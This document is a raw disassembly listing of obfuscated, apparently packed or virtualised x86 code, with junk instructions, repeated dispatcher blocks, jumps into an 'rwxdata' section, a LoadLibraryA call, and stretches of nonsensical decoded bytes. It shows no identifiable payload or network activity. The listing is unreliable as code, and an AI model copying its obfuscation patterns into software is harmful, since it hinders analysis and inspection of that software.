add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_4fdbf6
lea esp [ esp + 0x28 ]
jb rwxdata
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
jmp rwxdata
call sub_4d7f08
mov cl 0x8a
mov [ 0xffffffffae26cf52 ] eax
dec eax
enter 0x40f 0x3c
inc ecx
and eax 0x9fa25724
test al 0x5f
pop esp
out 0x43 al
mov dl 0x7f
jbe rwxdata
push ds
pop es
sub_4fdd35
lea esp [ esp + 0x48 ]
jae rwxdata
mov al 0x6a
seta al
push 0x55f02adc
pushad
lodsb [ esi ]
cmc
mov [ esp ] 0xe2
pushad
clc
rol al 0x7
jmp rwxdata
dec al
not bl
push edi
mov bl 0x2
mov al 0x7c
push [ esp ]
call sub_24a942
mov [ 0x56d16f42 ] eax
lodsd [ esi ]
inc ecx
bound ebp [ edx + 0x338cfc64 ]
mov al [ 0xffffffffcb3c1f35 ]
fwait
push edi
shl [ edi ] 0x24
shr esp cl
push esi
jg rwxdata
pushfd
add al 0x0
clc
bt bx 0x4
clc
clc
not al
mov [ esp + 0x10 ] 0xb27cfc3
clc
bt dx si
sub al 0x34
stc
shr eax 0x1
call sub_4db43a
adc eax 0x1da859dc
daa
jpe rwxdata
sti
std
dec edx
mov ecx 0x2dd6699a
fnstsw [ es : edx - 0x77 ]
or [ edx ] ch
retn 0xc97a
jns rwxdata
sti
ror [ ebp - 0x2c ] 0xed
frndint
cld
fstp st3
dec [ ebp - 0x8bf77c0 ]
add esp [ eax - 0x11 ]
daa
cmpsb [ esi ] [ edi ]
pop ebp
pop ebp
sub [ ebx + 0x36092388 ] dh
or [ esi - 0x59 ] ebx
pop esp
das
rcl [ edx ] cl
xchg ebx eax
test al 0x5f
insb
salc
aad 0x5f
outsd
push 0x5e
jns rwxdata
sti
pushfd
mov ecx 0x8a16120
std
cmp al 0x2f
pop ds
in eax 0x9
shl [ edi + 0xf ] 0x17
sub [ eax + 0x5b ] 0x68
out dx eax
dec eax
inc eax
retn
sub_4fdec5
add edi eax
mov [ esp ] 0xc3145e01
mov edi [ edi + ecx * 4 ]
push [ esp ]
cmp bl 0xa6
test edi edi
call sub_4da608
add ah 0x20
call sub_4d9d27
cwde
xchg ecx eax
push esp
jmp 0x3e6d744c
sub_4fe2e3
pushfd
jmp rwxdata
call sub_24b9f2
cmp ecx [ ebp - 0x8 ]
jmp rwxdata
pushfd
lea esp [ esp + 0x4 ]
jbe rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
ror di 0xe
lea edi [ 0xfffffffff59e35a9 ]
shr di 0xd
pushad
sub ecx 0x1
sub si cx
push ecx
bts di ax
mov [ ebp - 0x4 ] ecx
sub esp 0xffffffdc
shrd cx ax 0x6
not di
add esi 0x9f840703
mov ecx [ ebp - 0x8 ]
xadd si di
sar di 0xc
bts edi eax
add ecx [ ebp - 0x4 ]
pushfd
btr si si
not di
shr ecx 0x1
lea edi [ edx - 0x25f4a10 ]
bswap di
movsx di dl
stc
mov edi [ ebx + ecx * 4 ]
bsf si cx
bsf esi ebp
or si 0xe2a8
add edi eax
push [ esp ]
not esi
pop esi
pop esi
mov esi [ ebp + 0xc ]
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
sub_4fe472
pushad
lea esp [ esp + 0x44 ]
je rwxdata
xor bh 0x4
cmp dl al
mov bx [ esi ]
jmp rwxdata
push esp
cmp ebx 0x3
mov [ esp ] 0xad
pushfd
lea esp [ esp + 0x8 ]
je rwxdata
and ebx 0xfff
bt bx di
push eax
add [ ebx + edi ] dx
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
rcl bl cl
bt dx ax
setns bh
or bh 0x72
mov bx [ esi ]
bt si cx
and ebx 0xfff
push 0x937b8bb9
mov [ esp ] cl
add [ ebx + edi ] edx
lea esp [ esp + 0x4 ]
pushad
mov [ esp + 0x4 ] 0xa85538c4
lea esp [ esp + 0x20 ]
jmp rwxdata
pushad
add esi 0x2
pushfd
dec ecx
jmp sub_4dbbbe
sub_4fe517
xadd cx di
mov edi [ edx + 0x24 ]
lea ebx [ 0x3744d9e5 ]
shl ebx 0x1d
bt si 0xb
and cl dh
add edi eax
inc bx
bswap bx
rol ebx cl
mov ebx [ edx + 0x20 ]
sub cx cx
pop ecx
bts cx 0xe
sar cl 0x3
add ebx eax
setle cl
rol cl cl
stc
btr cx 0x3
mov edi edx
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
bt eax 0x1d
call sub_4d6b3e
jo rwxdata
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
bt cx bp
mov [ ebp - 0x8 ] 0x0
dec cx
inc ch
shr cx 0x4
add cl ah
mov ecx [ edx + 0x18 ]
pushfd
cmp ecx [ ebp - 0x8 ]
call sub_4d4845
lea esp [ esp + 0x28 ]
je rwxdata
bound edx [ ecx - 0x4e2b9e6e ]
add al 0x6e
test [ eax + 0x1331ac37 ] ecx
into
arpl [ edi ] cx
jecxz rwxdata
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
or bp 0x3e
mov ch 0xa2
push ecx
ficom [ 0x648da09e ]
pop esp
jg rwxdata
dec esi
jecxz rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
retn
inc ebx
push cs
leave
sub_4fe64b
push esi
lea esp [ esp + 0x18 ]
jne rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
movsx ecx bl
dec cx
and cl 0xf3
add si sp
mov ecx edi
clc
sar si cl
test cl 0xf6
sub ecx ebx
shl si 0x7
inc si
mov esi esp
push 0x8b41bd1f
jmp rwxdata
pushfd
sub edi 0x4
call sub_4d7382
or ebp [ edx + 0x4663e1ec ]
push cs
jmp 0xffffffffaf278e0e
sub_4fe866
mov ebx eax
inc edi
and cx 0x1216
bsf cx bp
mov edi eax
shr cl cl
movzx ecx bl
mov ecx 0x104
pushfd
pushfd
jmp rwxdata
stc
xor al al
jmp rwxdata
bt ax 0x1
stc
clc
[ edi ]
push [ esp ]
call j_sub_4fe64b
loop rwxdata
cmp al 0x1b
mov dh 0x36
xchg ecx eax
sbb eax 0xaab30b8
adc al 0xc0
sbb ecx edi
or bh [ edx + 0x10dab91d ]
fimul [ edx + 0x40a8dd10 ]
rcl [ ecx ] cl
mov dl 0x9c
adc eax 0x7fc7ea3f
movsx ebx bp
push ecx
0xa358255 0xada3
outsb
retn
sub_4fe898
lodsb [ esi ]
cmp bp 0x8180
pushfd
bt eax ecx
neg al
pushfd
pushfd
dec al
clc
pushfd
clc
stc
xor al 0x7c
jmp rwxdata
neg al
mov [ esp + 0x4 ] ax
clc
lea esp [ esp + 0x40 ]
jpe rwxdata
call sub_510821
cmc
not al
bt bx bp
bt bx 0x1
ror al 0x6
cmc
cmp al [ edi ]
pushfd
mov ah 0xbd
lea edi [ edi + 0x1 ]
movsx ax cl
movzx ax dl
setae ah
mov eax [ esp + 0x4 ]
pushfd
pushad
push [ esp + 0x4 ]
call sub_4d7fbd
sub_4fea63
pushad
pushfd
push [ esp ]
adc al al
jmp rwxdata
jmp rwxdata
mov [ esp + 0x14 ] 0x8a
mov [ esp + 0x4 ] ecx
lea esp [ esp + 0x2c ]
jae rwxdata
call sub_4d5240
pushfd
lea esp [ esp + 0x4 ]
jne rwxdata
test ah 0x6d
js rwxdata
jmp rwxdata
call sub_4d786c
clc
push esi
bsf si si
shrd si cx 0x5
mov esi edi
stc
stc
call sub_4d7c9a
lea esp [ esp + 0x28 ]
jne rwxdata
pushad
stosb [ edi ]
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
bsr ax di
mov ax 0x336e
bsr ax dx
sub edx edx
shr ax 0x9
and eax 0xc565c013
adc al ch
bt bx di
mov eax edx
push edx
test ax 0x731d
add edi 0x1
or al dl
add al ch
setbe al
mov al [ edi ]
cmc
cmp cl cl
jmp rwxdata
pushfd
call sub_4fd3de
sub [ ecx ] al
scasb [ edi ]
nop
and [ ebx ] esp
or al [ ecx - 0x5c ]
lea ebp [ esp + edi * 4 + 0x2f5c6dff ]
xor bh al
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
test al al
call sub_4dc222
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
sub_4fef68
lea esp [ esp + 0x14 ]
jb rwxdata
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
bt dx 0x4
test bl ah
cmp eax [ ebp - 0x10 ]
jmp rwxdata
push edi
lea esp [ esp + 0x4 ]
jae rwxdata
movsx bx dl
movsx bx bl
mov ebx eax
movzx di dl
movzx di dl
mov di 0x95a8
lea edi [ eax * 8 + 0x2452805 ]
mov edi eax
push esp
lea esp [ esp + 0x4 ]
jmp rwxdata
bts cx 0xb
rol cl 0x2
shr cl 0x1
mov ecx 0x104
cmp dl dl
push eax
pushad
sub al al
cmp sp dx
[ edi ]
mov [ esp ] esi
lea esp [ esp + 0x24 ]
js rwxdata
push ebx
call sub_4fd5ab
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
bswap edx
sub dx cx
xor eax eax
ror ecx cl
sub si 0x68b9
mov ecx edi
cmc
or esi edi
mov si 0x84bb
bts esi esi
sub ecx ebx
btr si bp
clc
mov esi esp
cmc
cmc
sub edi 0x4
cmc
test al cl
push [ edi ]
stc
stc
stc
cmp edi ebx
pushfd
push 0x527ea9cf
call sub_4d557e
call sub_4de546
sub_4fef9a
stc
bt bx di
jmp rwxdata
mov edi [ edi + ecx * 4 ]
stc
bt bx 0x7
test edi edi
pushad
call sub_4d6610
lahf
cwde
lea edi [ edi + 0x1 ]
movzx eax bl
movsx ax dl
not al
jmp rwxdata
pop eax
pushad
jmp rwxdata
lea esp [ esp + 0x20 ]
ja rwxdata
cmc
call sub_4fea6f
mov [ esp + 0x24 ] 0x47586ff8
push [ esp + 0x4 ]
mov [ esp + 0x4 ] 0x71
pushfd
push eax
lea esp [ esp + 0x30 ]
jmp rwxdata
pushad
pushfd
pushfd
mov [ esp + 0x4 ] 0x561c
lea esp [ esp + 0x28 ]
jb rwxdata
pushfd
pushad
mov [ esp + 0x8 ] sp
mov [ esp + 0x20 ] ecx
call sub_512539
jmp rwxdata
cmp ch 0x18
stc
cmp [ edi - 0x1 ] 0x0
pushad
lea esp [ esp + 0x20 ]
jne rwxdata
cmp ecx [ ebp - 0x8 ]
jmp rwxdata
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
dec di
shrd di cx cl
mov edi [ edx + 0x24 ]
jmp rwxdata
pushfd
lea esp [ esp + 0x4 ]
jbe rwxdata
stc
cmp ch ah
add edi eax
clc
pushad
cmp bl bh
movzx ecx [ edi + ecx * 2 ]
and edi ecx
call sub_24a46c
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
ror di 0xe
lea edi [ 0xfffffffff59e35a9 ]
shr di 0xd
pushad
sub ecx 0x1
sub si cx
push ecx
bts di ax
mov [ ebp - 0x4 ] ecx
sub esp 0xffffffdc
shrd cx ax 0x6
not di
add esi 0x9f840703
mov ecx [ ebp - 0x8 ]
xadd si di
sar di 0xc
bts edi eax
add ecx [ ebp - 0x4 ]
pushfd
btr si si
not di
shr ecx 0x1
lea edi [ edx - 0x25f4a10 ]
bswap di
movsx di dl
stc
mov edi [ ebx + ecx * 4 ]
bsf si cx
bsf esi ebp
or si 0xe2a8
add edi eax
push [ esp ]
not esi
pop esi
pop esi
mov esi [ ebp + 0xc ]
sub_4fefa4
cmp bx 0xc4dd
cmc
cmp eax [ ebp - 0x10 ]
pushad
push [ esp + 0x4 ]
pushfd
mov [ esp ] bl
lea esp [ esp + 0x2c ]
jae rwxdata
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
movzx di al
not di
mov ebx eax
pushad
lea edi [ ebp + 0x6ad84173 ]
mov edi eax
pushfd
pushad
lea esp [ esp + 0x44 ]
jmp rwxdata
bts cx 0xb
rol cl 0x2
shr cl 0x1
mov ecx 0x104
cmp dl dl
push eax
pushad
sub al al
cmp sp dx
[ edi ]
mov [ esp ] esi
lea esp [ esp + 0x24 ]
js rwxdata
push ebx
call sub_4fd5ab
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
bswap edx
sub dx cx
xor eax eax
ror ecx cl
sub si 0x68b9
mov ecx edi
cmc
or esi edi
mov si 0x84bb
bts esi esi
sub ecx ebx
btr si bp
clc
mov esi esp
cmc
cmc
sub edi 0x4
cmc
test al cl
push [ edi ]
stc
stc
stc
cmp edi ebx
pushfd
push 0x527ea9cf
call sub_4d557e
call sub_4de546
sub_5103f4
add ecx 0x1
push [ esp ]
push edi
mov [ ebp - 0x8 ] ecx
pushfd
push [ esp + 0x4 ]
pushfd
lea esp [ esp + 0x1c ]
jmp rwxdata
shrd cx ax 0x6
not di
add esi 0x9f840703
mov ecx [ ebp - 0x8 ]
xadd si di
sar di 0xc
bts edi eax
add ecx [ ebp - 0x4 ]
pushfd
btr si si
not di
shr ecx 0x1
lea edi [ edx - 0x25f4a10 ]
bswap di
movsx di dl
stc
mov edi [ ebx + ecx * 4 ]
bsf si cx
bsf esi ebp
or si 0xe2a8
add edi eax
push [ esp ]
not esi
pop esi
pop esi
mov esi [ ebp + 0xc ]
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
sub_51040d
mov [ esp + 0x4 ] 0x15f1
lea esp [ esp + 0x2c ]
je rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
test bh 0x1f
test bh bl
bt bx 0xa
add eax edi
bt ax 0x6
test esp 0xa34f85e4
cmp eax edx
call sub_4d360d
pop ebx
0x26cf7e87 0xdbba
push ds
loope rwxdata
mov edi 0x5725703
xchg edx eax
mov esp 0x9ab8271d
xor [ edx + 0x4f ] 0xfffffff1
push edx
mov eax [ 0xffffffffc031003e ]
pushfd
adc [ ebx ] esi
xchg esp eax
mov esi 0x5a05268d
pop ebx
inc esi
movsd [ edi ] [ esi ]
insb
mov ebx 0xba2d9347
pop ecx
salc
ficom [ edx - 0x57ac090b ]
ja rwxdata
sahf
inc esi
enter 0xb041 0xb9
xchg ebx eax
inc esp
mov eax 0xe5ff6192
stc
inc edi
int 0x2b
xchg esi eax
pop esi
xchg [ esi + 0x440a3c5c ] dh
out 0xbd al
push ecx
imul dh
rcl [ ecx + 0x7b ] 0x1
cmc
cmp [ edx - 0x78 ] dl
cmpsb [ esi ] [ edi ]
dec edx
in eax dx
mov ebp [ ecx + 0x64 ]
push edx
adc [ esi - 0x62 ] esp
sub_5106b9
lea esp [ esp + 0x8 ]
jne rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
sar si cl
movzx si bl
xor esi ecx
rcl si cl
mov ecx edi
movzx si dl
rcl esi cl
clc
sub ecx ebx
rol si cl
bts esi eax
mov esi esp
push edx
test sp bp
bt di 0x4
mov [ esp ] 0xed
sub edi 0x4
test dx 0x3ee1
push [ edi ]
pop [ esp ]
jmp rwxdata
cmc
call sub_24c005
imul edx edx 0xa
push 0xbcb00b6
add edx eax
mov [ esp ] bp
pushfd
push edi
lea esp [ esp + 0x10 ]
jmp sub_4db31d
sub_510701
pushfd
cmc
stc
rol dl 0x7
cmc
jmp rwxdata
add dl 0x0
cmc
bt di bp
mov [ esp + 0x4 ] bh
bt edi eax
not dl
call sub_4dabe2
daa
add [ ecx ] bl
call 0xffffffffe36db555
push ebx
pop eax
xor ah bl
aas
dec esi
fwait
or [ edx + 0x2e ] cl
retn 0x2a15
sub_510821
bt edx eax
pushad
cmc
not al
jmp rwxdata
pushfd
ror al 0x6
clc
cmp al [ edi ]
lea eax [ ecx + 0x5f10b60d ]
mov [ esp ] 0xd227145b
lea edi [ edi + 0x1 ]
movzx ax dl
mov [ esp ] ah
bswap eax
lahf
mov eax [ esp + 0x28 ]
call j_sub_4d7783
sub_51082d
not bl
setne bl
inc ecx
clc
rcr bl 0x3
rcr bl cl
shr bl 0x2
and al 0x35
mov [ 0x6609dd79 ] eax
scasb [ edi ]
lodsd [ esi ]
and bh [ ebx ]
xchg ecx eax
jpo rwxdata
cmc
or al 0x80
jl rwxdata
sbb [ ecx - 0x9d17a60 ] cl
cld
inc ebx
or eax 0xe81c7914
salc
js rwxdata
in al 0x3e
push esp
jle rwxdata
salc
xchg esi eax
jge rwxdata
inc eax
jno rwxdata
push cs
mov edi 0xd36ec81
fld [ edx + 0x5a ]
cdq
or eax 0xaab24eeb
push edx
mov al 0xa9
jge rwxdata
jns rwxdata
rcr bl cl
call sub_4dac2c
jne rwxdata
mov bl 0x63
mov [ 0x4a8f7780 ] eax
sti
fdivr st1
daa
sub bh [ edi - 0x71a056ab ]
cmp al 0x11
or bh cl
inc esp
jge rwxdata
xchg ebp eax
movsx ax al
mov eax ebp
rol [ edi ] 0x72
push ss
0xd659ba4b 0x1619
std
inc esi
mov ebp 0x4d2ca89e
or eax 0xe81c7914
aad 0xd9
cld
clc
shl [ edx ] cl
and [ esi + 0x5f ] 0x4e
rcr al 0x1
jmp rwxdata
xor [ edx ] 0x53
or eax 0x589bdd37
and ebx esi
push ebx
push cs
rol [ eax + 0x71 ] 0xdc
mov [ 0x797d8255 ] eax
and edx edi
into
mov ecx 0x458d7d86
in al 0x34
xor eax 0x821b4f5
salc
insd
and eax 0x187048d9
add [ esi + 0x1b4409de ] 0x86
sbb [ ecx + eax * 8 - 0x44de7aa1 ] 0xce
adc al 0xcc
xchg ebx eax
jbe rwxdata
call 0xffffffffc7bb50b8
xchg ebx eax
inc edi
ffree st6
mov bh 0xbd
xor esp [ ecx - 0x3b ]
or edx ecx
fldcw [ ebp + ebx * 4 + 0x18fee547 ]
nop
xchg edi eax
lds edx [ edi - 0x1f ]
retn 0xb000
cmpsb [ esi ] [ edi ]
inc ecx
rcl [ ebp - 0x73 ] cl
dec ebx
movsb [ edi ] cs : [ esi ]
xlat
not edx
cli
test [ ebx ] 0xe028df89
jmp rwxdata
mov dl 0x30
enter 0x7616 0xc6
dec esp
int 0x1b

jno rwxdata
pushfd
mov al 0x2e
pushfd
cmp ah 0x31
cmc
pushfd
[ edi ]
pushad
lea esp [ esp + 0x2c ]
jne rwxdata
cmp dl 0x8c
mov al 0x2e
test dh ah
stc
[ edi ]
push 0xbe1f1512
call sub_4fd852
add [ eax ] al
inc ebx
push 0x70557261
jo rwxdata
pushad
mov [ esp + 0xc ] cx
mov esp esi
pushad
pushad
pushfd
push ebp
lea esp [ esp + 0x48 ]
jmp rwxdata
setle ah
pushad
mov [ edi - 0x1 ] 0x0
setpo al
cwde
lea eax [ esp - 0x6d22dd68 ]
mov [ esp + 0x1c ] ebx
pushad
movsx ax bl
lea eax [ rwxdata ]
jmp rwxdata
sbb [ ebp - 0x2c ] 0xed
sub al 0xfa
dec ecx
mov ah 0xfa
or al 0xc3
push ss
pop ss
retn 0x86ce
jb rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
call sub_4d5524
sbb ch cl
sub al 0x54
fst [ edi ]
loop rwxdata
add [ edx - 0x136c5c7 ] bh
inc eax
frndint
iretd
xchg [ edx + 0x4d ] eax
xlat
pop esi
sub al 0x39
sub_510a92
call sub_4da628
push 0x7340fec1
enter 0x2575 0x1e
adc dh [ ebp + 0x5eedf0c9 ]
xchg ebp eax
scasb [ edi ]
inc ebp
inc esi
or [ 0x313cc0d4 ] bl
shr [ eax + eax * 2 - 0x57a623e0 ] 0x85
jl rwxdata
sbb eax 0x313cc0d4
add bl cl
pushad
mov bh 0x8
pcmpgtb mmx1 [ ebp + 0x38 ]
xchg edi eax
scasb [ edi ]
xchg edi eax
cmc
push ss
int1
popad
adc ch [ bx + di ]
fldcw [ ebx + ebx * 2 - 0x1b ]
popad
sub [ ebp + 0x7d349235 ] bh
movsd [ edi ] [ esi ]
mov fs [ ebp + 0x38 ]
or ch cl
push cs
jmp rwxdata
mov eax 0xefd3e213
0xc61095cd 0x5db4
sub_510b6f
push 0x3375a79d
lea esp [ esp + 0x2c ]
jae rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
push ebp
call sub_5103f4
sub_510d1f
pushad
clc
cmp [ edi ] 0x23
call sub_4db7ae
lea esp [ esp + 0x40 ]
jne rwxdata
call sub_2493e2
movzx ax dl
pushad
pop eax
mov eax [ edx + 0x8 ]
push [ esp ]
mov [ esp + 0x10 ] si
lea esp [ esp + 0x20 ]
jmp rwxdata
jmp rwxdata
or ebx ebx
jmp sub_4da277
sub_510e46
pushfd
dec al
pushfd
jmp rwxdata
xor al 0x7c
stc
jmp rwxdata
neg al
stc
push [ esp + 0x4 ]
not al
mov [ esp + 0x4 ] 0x14
stc
push [ esp ]
ror al 0x6
jmp rwxdata
cmp al [ edi ]
pushfd
movsx ax al
lea esp [ esp + 0x40 ]
jge rwxdata
jmp rwxdata
lea edi [ edi + 0x1 ]
push ebp
movsx ax cl
pushfd
lea esp [ esp + 0x8 ]
jl rwxdata
lahf
cwde
lea edi [ edi + 0x1 ]
movzx eax bl
movsx ax dl
not al
jmp rwxdata
call sub_4fdafa
pop eax
pushfd
lea esp [ esp + 0x4 ]
ja rwxdata
pop eax
pushad
jmp rwxdata
cmc
call sub_4fea6f
mov [ esp + 0x24 ] 0x47586ff8
push [ esp + 0x4 ]
mov [ esp + 0x4 ] 0x71
pushfd
push eax
lea esp [ esp + 0x30 ]
jmp rwxdata
call sub_4d4aeb
mov [ esp ] 0x4c048460
call sub_24a47c
push eax
lea esp [ esp + 0x20 ]
ja rwxdata
pushfd
pushad
mov [ esp + 0x8 ] sp
mov [ esp + 0x20 ] ecx
call sub_512539
pushad
pushfd
pushfd
mov [ esp + 0x4 ] 0x561c
lea esp [ esp + 0x28 ]
jb rwxdata
jmp rwxdata
cmp ch 0x18
stc
cmp [ edi - 0x1 ] 0x0
pushad
lea esp [ esp + 0x20 ]
jne rwxdata
cmp ecx [ ebp - 0x8 ]
jmp rwxdata
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
dec di
shrd di cx cl
mov edi [ edx + 0x24 ]
jmp rwxdata
pushfd
lea esp [ esp + 0x4 ]
jbe rwxdata
stc
cmp ch ah
add edi eax
clc
pushad
cmp bl bh
movzx ecx [ edi + ecx * 2 ]
and edi ecx
call sub_24a46c
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
ror di 0xe
lea edi [ 0xfffffffff59e35a9 ]
shr di 0xd
pushad
sub ecx 0x1
sub si cx
push ecx
bts di ax
mov [ ebp - 0x4 ] ecx
sub esp 0xffffffdc
shrd cx ax 0x6
not di
add esi 0x9f840703
mov ecx [ ebp - 0x8 ]
xadd si di
sar di 0xc
bts edi eax
add ecx [ ebp - 0x4 ]
pushfd
btr si si
not di
shr ecx 0x1
lea edi [ edx - 0x25f4a10 ]
bswap di
movsx di dl
stc
mov edi [ ebx + ecx * 4 ]
bsf si cx
bsf esi ebp
or si 0xe2a8
add edi eax
push [ esp ]
not esi
pop esi
pop esi
mov esi [ ebp + 0xc ]
sub_5110df
mov [ esp ] 0xa4
mov [ esp ] 0x6a4b
lea esp [ esp + 0x2c ]
je rwxdata
or bl ah
mov bx [ esi ]
cmp ah 0x18
and ebx 0xfff
pushfd
cmp dl bh
add [ ebx + edi ] ax
push ebp
lea esp [ esp + 0x8 ]
jmp rwxdata
cmp cl 0x52
bt bp 0x9
stc
bt si 0x1
cmp ebx 0x2
pushad
call sub_4fe472
pushad
add esi 0x2
pushfd
dec ecx
jmp sub_4dbbbe
sub_51110a
test edi edi
jmp rwxdata
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
sub_5111f7
pushfd
lea esp [ esp + 0x2c ]
je rwxdata
push eax
jmp rwxdata
clc
test ebx 0x81f11b72
add edx 0x11c
pushfd
push 0x757413d3
lea esp [ esp + 0x8 ]
jmp rwxdata
clc
mov [ esp ] 0x84
xor eax eax
add esp 0x4
jmp rwxdata
xchg si di
call sub_4dd0e7
jmp [ LoadLibraryA@IAT ]
or ebx ebx
jmp sub_4da277
sub_51125c
mov [ esp ] 0xc4
mov [ esp + 0x34 ] 0x0
push 0xe05355eb
lea esp [ esp + 0x38 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_511276
mov [ esp + 0x24 ] ebx
pushfd
call sub_513144
push 0x889ec10b
pushfd
push 0xcac57914
mov [ esp ] 0x2a
lea esp [ esp + 0xc ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
